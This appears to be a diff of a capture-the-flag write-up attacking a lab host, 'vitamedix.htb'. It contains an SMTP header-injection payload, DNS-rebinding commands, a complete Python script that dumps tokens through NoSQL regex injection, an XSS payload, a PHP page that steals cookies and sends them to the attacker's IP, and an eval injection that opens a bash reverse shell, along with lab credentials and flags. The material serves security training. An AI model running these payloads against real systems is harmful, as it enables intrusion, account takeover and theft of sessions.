@@ -704,7 +704,7 @@ if __name__ == "__main__":
 ```
 
 After trying emails in users.php
-on forgot password , we get a valid email   `michael@vitamedix.htb`
+on forgot password  in selfservice, we get a valid email   `michael@vitamedix.htb`
 
 ![[Screenshot from 2026-08-09 17-19-23.png]]
 
@@ -841,6 +841,9 @@ at the reset password above we identified `michael@vitamedix.htb`
 Now we send this payload 
 `michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+`
 
+![[Screenshot from 2026-08-12 10-28-16.png]]
+
+
 and we get the victim password too
 ![[Screenshot from 2026-08-09 17-39-19.png]]
 
@@ -855,6 +858,22 @@ leaked internal url in code
 
 
 
+and run responder
+
+```terminal
+sudo python3 dnsrebinder.py --domain attacker.com --rebind 0.0.0.0 --ip 1.1.1.1 --counter 1 --tcp --udp
+Starting nameserver...
+UDP server loop running in thread: Thread-1 (serve_forever)
+TCP server loop running in thread: Thread-2 (serve_forever)
+/home/hassan/Desktop/scripts/DNSrebinder/dnsrebinder.py:110: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
+
+
+```
+
+
+
+
 
 WE go to pdf generation  and point it to our domain in the DNSrebinder command `attacker.com`
 and we point it to 
@@ -863,6 +882,162 @@ and we point it to
 we get this response
 `{"_id":"admin","_rev":"1-
 2bb338a880df5181a728ee2b9256af36","username":"admin","password":"Adm111n@341","full_name":"Administrator","role":"doctor","address":"Vitamedix"}`
+
+
+NOSQLI
+
+nosqli were found in verifyToken leading to leaking token and generating accounts 
+
+payload: 
+`{"token":{"$regex":"^0.*"}}`
+
+![[Screenshot from 2026-08-12 10-49-27.png]]
+
+dump tokens 
+
+```python 
+#!/usr/bin/env python3  
+"""  
+Dump tokens from /api/validateToken using a NoSQL regex boolean oracle.  
+  
+Oracle:  
+  {"message":"true"}  -> prefix matches at least one token  {"message":"false"} -> no token matches the prefix  
+Only lowercase letters and digits are brute-forced.  
+"""  
+  
+import argparse  
+import string  
+from concurrent.futures import ThreadPoolExecutor, as_completed  
+  
+import requests  
+from requests.adapters import HTTPAdapter  
+from urllib3.util.retry import Retry  
+  
+DEFAULT_HOST = "www.vitamedix.htb"  
+DEFAULT_COOKIE = (  
+    "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."  
+    "eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImRvY3RvciIsImlhdCI6MTc4NjM3MzkyMH0."    "FJkYqLtliOqBKd5hh67Ho95ForiTQ25XsWlC-E3rbB8")  
+USER_AGENT = (  
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) "  
+    "Gecko/20100101 Firefox/152.0")  
+ALPHABET = string.ascii_lowercase + string.digits  
+  
+  
+def build_session():  
+    s = requests.Session()  
+    retries = Retry(total=3, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])  
+    s.mount("http://", HTTPAdapter(max_retries=retries))  
+    s.mount("https://", HTTPAdapter(max_retries=retries))  
+    return s  
+  
+  
+def is_true(resp):  
+    try:  
+        data = resp.json()  
+    except Exception:  
+        return False  
+    return isinstance(data, dict) and str(data.get("message")).lower() == "true"  
+  
+  
+def check_prefix(sess, url, headers, prefix, char):  
+    payload = {"token": {"$regex": f"^{prefix}{char}.*"}}  
+    try:  
+        resp = sess.post(url, headers=headers, json=payload, timeout=15)  
+    except requests.RequestException as exc:  
+        return char, False, str(exc)  
+    return char, is_true(resp), resp.status_code  
+  
+  
+def dump_tokens(host, cookie, scheme, alphabet, max_depth, workers):  
+    url = f"{scheme}://{host}/api/validateToken"  
+    headers = {  
+        "Host": host,  
+        "User-Agent": USER_AGENT,  
+        "Accept": "*/*",  
+        "Accept-Language": "en-US,en;q=0.9",  
+        "Accept-Encoding": "gzip, deflate, br",  
+        "Connection": "keep-alive",  
+        "Cookie": cookie,  
+        "Upgrade-Insecure-Requests": "1",  
+        "Priority": "u=0, i",  
+        "Content-Type": "application/json",  
+    }  
+  
+    sess = build_session()  
+    queue = [""]  
+    found = []  
+  
+    print(f"[*] Target: {url}")  
+    print(f"[*] Alphabet: {alphabet!r} ({len(alphabet)} chars)")  
+    print(f"[*] Workers: {workers}\n")  
+  
+    while queue:  
+        prefix = queue.pop(0)  
+        matches = []  
+  
+        with ThreadPoolExecutor(max_workers=workers) as ex:  
+            futures = {ex.submit(check_prefix, sess, url, headers, prefix, ch): ch for ch in alphabet}  
+            for future in as_completed(futures):  
+                char, ok, status = future.result()  
+                if ok:  
+                    matches.append(char)  
+                    print(f"[+] prefix '{prefix}{char}' matched (HTTP {status})")  
+                elif not isinstance(status, int):  
+                    print(f"[!] prefix '{prefix}{char}' error: {status}")  
+  
+        for char in sorted(matches):  
+            candidate = prefix + char  
+            if len(candidate) >= max_depth:  
+                found.append(candidate)  
+                print(f"[FOUND max-depth] {candidate}")  
+                continue  
+  
+            # Is this the full token? Exact-match check.  
+            resp = sess.post(url, headers=headers, json={"token": {"$regex": f"^{candidate}$"}}, timeout=15)  
+            if is_true(resp):  
+                found.append(candidate)  
+                print(f"[FOUND TOKEN] {candidate}")  
+            else:  
+                queue.append(candidate)  
+  
+    print(f"\n[*] Total found: {len(found)}")  
+    for token in found:  
+        print(token)  
+    return found  
+  
+  
+def main():  
+    parser = argparse.ArgumentParser(description="Dump tokens via NoSQL regex oracle")  
+    parser.add_argument("--host", default=DEFAULT_HOST, help="Target host")  
+    parser.add_argument("--cookie", default=DEFAULT_COOKIE, help="Session cookie")  
+    parser.add_argument("--scheme", default="http", choices=["http", "https"])  
+    parser.add_argument("--alphabet", default=ALPHABET, help="Characters to test")  
+    parser.add_argument("--max-depth", type=int, default=64, help="Max token length")  
+    parser.add_argument("--workers", type=int, default=8, help="Concurrent threads")  
+    args = parser.parse_args()  
+  
+    dump_tokens(  
+        host=args.host,  
+        cookie=args.cookie,  
+        scheme=args.scheme,  
+        alphabet=args.alphabet,  
+        max_depth=args.max_depth,  
+        workers=args.workers,  
+    )  
+  
+  
+if __name__ == "__main__":  
+    main()
+```
+
+`[FOUND TOKEN] 01f68f66cd3b7eed3a446a7cfd33b342`
+
+![[Screenshot from 2026-08-12 11-05-00.png]]
+
+
+now we create a user with the token 
+
+![[Screenshot from 2026-08-12 11-06-23.png]]
 ### DNS.vitamedix
 
 passowrd leaked for DNS.vitamedix:8006
@@ -894,18 +1069,138 @@ services:
 
 ![[Screenshot from 2026-08-09 18-10-49.png]]
 
-and run responder
+
+XSS to get admin cookie:
+XSS was found at www.vitamedix.htb 
+using the payload 
+`</option></select><script>alert("YOU HAVE BEEN PWNED")</script><option><select>`
+![[Screenshot from 2026-08-12 10-36-17.png]]
+
+
+now we extract the bot cookie
+
+first we run DNS rebinder point to our ip with domain name www.vitamedix.htb
 
 ```terminal
-sudo python3 dnsrebinder.py --domain attacker.com --rebind 0.0.0.0 --ip 1.1.1.1 --counter 1 --tcp --udp
-Starting nameserver...
-UDP server loop running in thread: Thread-1 (serve_forever)
-TCP server loop running in thread: Thread-2 (serve_forever)
-/home/hassan/Desktop/scripts/DNSrebinder/dnsrebinder.py:110: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-
+sudo python3 dnsrebinder.py --domain www.vitamedix.htb --rebind 10.10.17.8 --ip 1.1.1.1 --counter 1 --tcp --udp
 
 ```
+
+![[Screenshot from 2026-08-12 10-32-55.png]]
+
+
+
+
+
+
+then we host a `redirect.php` file at php server at 4444
+```terminal
+php -S 0.0.0.0:4444 -t .
+```
+
+then we host the listener that we will recieve the payload at 4444
+```
+python3 -m http.server 4444
+```
+
+redirect.php file 
+```php
+<?php
+$log_file = __DIR__ . '/requests.log';
+
+$request = "\n" . str_repeat("=", 80) . "\n";
+$request .= "Time: " . date('Y-m-d H:i:s T') . "\n";
+$request .= "From: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
+$request .= "Method: " . ($_SERVER['REQUEST_METHOD'] ?? 'unknown') . "\n";
+$request .= "URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown') . "\n";
+$request .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'none') . "\n";
+$request .= "Referer: " . ($_SERVER['HTTP_REFERER'] ?? 'none') . "\n";
+$request .= "\n--- HEADERS ---\n";
+foreach (getallheaders() as $name => $value) {
+    $request .= "$name: $value\n";
+}
+$request .= "\n--- COOKIES ---\n";
+foreach ($_COOKIE as $name => $value) {
+    $request .= "$name: $value\n";
+}
+file_put_contents($log_file, $request, FILE_APPEND | LOCK_EX);
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Submit</title>
+</head>
+<body>
+    <p>Submitting JSON settings requests...</p>
+    <script>
+        const payload = '{"full_name":"<\\/option><\\/select><script>fetch(\'http:\/\/10.10.17.8:4445\/?d=\'+btoa(unescape(encodeURIComponent(document.cookie))));<\\/script><option><select>","address":"javascript:alert"}';
+        const targets = [
+            'http://vitamedix.htb/api/settings',
+            'http://www.vitamedix.htb/api/settings'
+        ];
+
+        function sendFetch(url, withCreds) {
+            return fetch(url, {
+                method: 'POST',
+                credentials: withCreds ? 'include' : 'omit',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload
+            }).catch(() => {});
+        }
+
+        function sendXHR(url, withCreds) {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', url, true);
+                xhr.withCredentials = withCreds;
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onload = resolve;
+                xhr.onerror = resolve;
+                xhr.ontimeout = resolve;
+                xhr.send(payload);
+            });
+        }
+
+        const promises = [];
+        for (const url of targets) {
+            for (let k = 0; k < 2; k++) {
+                promises.push(sendFetch(url, true));
+                promises.push(sendFetch(url, false));
+                promises.push(sendXHR(url, true));
+                promises.push(sendXHR(url, false));
+            }
+        }
+
+        Promise.all(promises).finally(() => {
+            window.location.href = 'http://vitamedix.htb/settings';
+        });
+    </script>
+</body>
+</html>
+
+```
+
+![[Screenshot from 2026-08-12 10-32-27.png]]
+
+
+then we submit document url 
+`http://www.vitamedix.htb:4444/redirect.php`
+which will make change his full name to the xss and send his cookie to the listener
+
+![[Screenshot from 2026-08-12 10-32-15.png]]
+
+admin cookie `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImRvY3RvciIsImlhdCI6MTc4NjUyMDMxMn0.WKgDXe06KHhTafT46fTyPOBOEDX2GDlufBDezMY-WiM`
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -917,17 +1212,57 @@ now we use  michael:9ecf1ffe7c795099b8ad40d29aa37a83 creds to access newsletter 
 
 
 
+RCE via eval 
+
+we notice eval function that take user input 
+
+```if (
+
+settings.greeting.length > 30 || // max length of 30 chars
+
+eval(
+
+`var specialChars = ['#', ';', '\\'', '"', '\\\\']; "${settings.greeting}".split('').some(char => specialChars.includes(char))`
+
+)
+
+) {
+
+reject("Invalid greeting (max 30 chars)!");
+
+return;
+
+}
 
 
 
+```
 
+now  inject our payload 
 
+```POST /api/settings/save HTTP/1.1
+Host: newsletter.vitamedix.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: http://newsletter.vitamedix.htb/settings
+Content-Type: application/json
+Content-Length: 240
+Origin: http://newsletter.vitamedix.htb
+Connection: keep-alive
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pY2hhZWwiLCJpYXQiOjE3ODY1MTg1MDQsImV4cCI6MTc4NjYwNDkwNH0.7H5rsDOikTSkrhrIpRmcYWwFSEUEqX_KEmTlRsP2ZRg
+Priority: u=0
 
+{"name":"require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.17.8whoam/4444 0>&1\"')","email":"michael@vitamedix.htb","frequency":"daily","timezone":"UTC","greeting":"\"+eval(settings.name)+\"","feedback":"no","heatmaps":"no"}
+```
+![[Screenshot from 2026-08-12 10-15-04.png]]
 
+and setup our listener at 4444
 
+![[Screenshot from 2026-08-12 10-15-36.png]]
 
-
-
+and we get the second flag    `7c6ada9cb7aa60c7740bcb1dde7496bf`
 
 
 # **Secure Data**
